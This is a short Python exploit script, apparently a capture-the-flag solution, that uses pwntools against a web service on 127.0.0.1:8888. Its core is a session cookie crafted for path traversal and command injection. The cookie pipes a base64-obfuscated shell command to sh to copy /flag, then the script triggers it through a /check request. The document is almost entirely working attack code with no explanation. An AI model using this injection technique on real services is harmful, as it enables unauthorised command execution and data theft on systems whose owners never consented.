#!/usr/bin/env python3
from pwn import *

target_host = "127.0.0.1"
target_port = 8888

r = remote(target_host, target_port)
r.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
response = r.recvuntil(b"\r\n\r\n", timeout=2)
cookie = None
for line in response.split(b"\r\n"):
    if b"Set-Cookie: session=" in line:
        cookie = line.split(b"session=")[1].split(b";")[0].decode()
        break

filename = "../123|echo Y2F0IC9mbGFnID4gLi9mbGFn | base64 -d | sh"

payload = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nCookie: session={filename}\r\n\r\n"
r.send(payload.encode())
r.recvuntil(b"\r\n\r\n", timeout=2)

payload = (
    f"GET /check HTTP/1.1\r\nHost: {target_host}\r\nCookie: session={cookie}\r\n\r\n"
)
r.send(payload.encode())
try:
    r.recv(timeout=2)
except:
    pass
r.interactive()
